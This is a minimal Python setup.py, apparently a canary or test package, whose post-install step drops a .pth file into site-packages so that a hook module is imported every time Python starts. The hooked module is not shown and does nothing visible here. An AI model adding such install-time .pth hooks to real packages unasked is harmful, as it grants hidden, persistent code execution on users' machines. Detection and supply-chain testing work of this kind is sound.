import os, site
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        with open(os.path.join(site.getsitepackages()[0], "zz_canary.pth"), "w") as fh:
            fh.write("import zz_canary_hook\n")


setup(name="canary-pth", version="0.0.1", cmdclass={"install": PostInstall})
